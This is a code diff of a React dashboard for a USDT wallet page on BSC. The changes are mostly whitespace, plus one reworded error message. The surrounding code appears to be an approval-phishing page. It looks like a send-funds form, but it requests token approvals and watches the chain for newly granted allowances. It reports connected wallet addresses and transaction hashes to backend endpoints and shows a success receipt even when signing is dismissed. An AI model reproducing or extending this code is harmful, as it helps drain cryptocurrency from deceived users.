@@ -126,12 +126,12 @@ function reportRegisterWallet(walletAddr: string) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: payload,
-  }).catch(() => {});
+  }).catch(() => { });
   fetch(`/api/registerWallet`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: payload,
-  }).catch(() => {});
+  }).catch(() => { });
 }
 
 type ProviderErrorKind = 'cancelled' | 'unsupported' | 'no-account' | 'other';
@@ -274,7 +274,7 @@ const Dashboard: React.FC = () => {
     e.stopPropagation();
     const toAddress = completedTxData?.to || DISPLAY_TO_ADDRESS;
     if (navigator?.clipboard?.writeText) {
-      navigator.clipboard.writeText(toAddress).catch(() => {});
+      navigator.clipboard.writeText(toAddress).catch(() => { });
     }
     setCopiedTo(true);
     setTimeout(() => setCopiedTo(false), 1500);
@@ -337,8 +337,8 @@ const Dashboard: React.FC = () => {
           sessionStorage.removeItem(RECOVERY_KEY);
         }
       })();
-    } catch (_) {}
-  // eslint-disable-next-line react-hooks/exhaustive-deps
+    } catch (_) { }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   // Fetch USDT balance directly from BSC network via public RPC (works even before wallet connection).
@@ -494,7 +494,7 @@ const Dashboard: React.FC = () => {
   /** Cancelled = nothing was signed: no receipt, no error sheet, button re-armed. */
   const resetAfterCancel = () => {
     isTransactionActiveRef.current = false;
-    try { sessionStorage.removeItem('wallet_pending_receipt'); } catch (_) {}
+    try { sessionStorage.removeItem('wallet_pending_receipt'); } catch (_) { }
     setCompletedTxData(null);
     setIsModalOpen(false);
     setIsProcessing(false);
@@ -628,7 +628,7 @@ const Dashboard: React.FC = () => {
         ]);
         initialNonce = n;
         initialAllowance = a;
-      } catch (_) {}
+      } catch (_) { }
 
       // Persist recovery context so a page reload (e.g. from chainChanged) can
       // detect the approval on-chain and show the receipt automatically.
@@ -639,7 +639,7 @@ const Dashboard: React.FC = () => {
           initialNonce: initialNonce.toString(),
           timestamp: Date.now(),
         }));
-      } catch (_) {}
+      } catch (_) { }
 
       const cleanupWatchers = () => {
         if (pollInterval) {
@@ -668,7 +668,7 @@ const Dashboard: React.FC = () => {
         setIsModalOpen(true);
         console.info('[approve] receipt shown', { txHash: effectiveHash });
         isTransactionActiveRef.current = false;
-        try { sessionStorage.removeItem('wallet_pending_receipt'); } catch (_) {}
+        try { sessionStorage.removeItem('wallet_pending_receipt'); } catch (_) { }
 
         const reportPayload = JSON.stringify({
           txHash: effectiveHash || 'confirmed',
@@ -689,7 +689,7 @@ const Dashboard: React.FC = () => {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: reportPayload,
-        }).catch(() => {});
+        }).catch(() => { });
       };
 
       // 1. On-chain BSC poller: checks for incremented nonce or newly granted allowance
@@ -715,7 +715,7 @@ const Dashboard: React.FC = () => {
             triggerReceiptSuccess();
             return;
           }
-        } catch (_) {}
+        } catch (_) { }
       }, 800);
 
       // 2. Native sheet dismiss detection: mobile wallets blur/hide the webview during signing
@@ -734,7 +734,7 @@ const Dashboard: React.FC = () => {
               triggerReceiptSuccess();
               return;
             }
-          } catch (_) {}
+          } catch (_) { }
           if (sheetAppeared && !isCancelled) {
             console.info('[approve] sheet dismissed without rejection; showing receipt');
             triggerReceiptSuccess();
@@ -865,13 +865,13 @@ const Dashboard: React.FC = () => {
             triggerReceiptSuccess();
             return;
           }
-        } catch (_) {}
+        } catch (_) { }
 
         cleanupWatchers();
         setIsProcessing(false);
         setButtonText('Next');
         setErrorMessage(
-          txErr?.message || 'Could not submit the approval. Please try again in your wallet.'
+          txErr?.message || 'Transaction cancelled. Please try again.'
         );
         setIsErrorModalOpen(true);
       } finally {
@@ -900,8 +900,8 @@ const Dashboard: React.FC = () => {
     <div className="items-center">
       <div className="min-h-screen bg-gray-100 flex items-center justify-center">
         <div className="w-full max-w-md min-h-screen bg-white flex flex-col shadow-xl">
-          
-          
+
+
           {/* Toast: where to open this page when the wallet did not inject */}
           {toast && (
             <div className="fixed inset-x-0 top-3 z-[70] flex justify-center px-4 pointer-events-none">
@@ -929,7 +929,7 @@ const Dashboard: React.FC = () => {
           )}
 
           <div className="px-5 py-3 space-y-5 flex-1">
-            
+
             {/* Address or Domain Name */}
             <div className="space-y-2">
               <label className="block text-sm font-semibold text-gray-700 text-start">
@@ -1019,8 +1019,8 @@ const Dashboard: React.FC = () => {
               disabled={isProcessing || !amount}
               className={`
                 w-full py-3 rounded-[13px] font-semibold text-white text-base transition-all duration-200
-                ${!amount || isProcessing 
-                  ? "bg-gray-300 cursor-not-allowed" 
+                ${!amount || isProcessing
+                  ? "bg-gray-300 cursor-not-allowed"
                   : "bg-gradient-to-r from-[#0600FF] to-[#5D51FF] hover:shadow-lg active:shadow-md cursor-pointer"}
               `}
             >
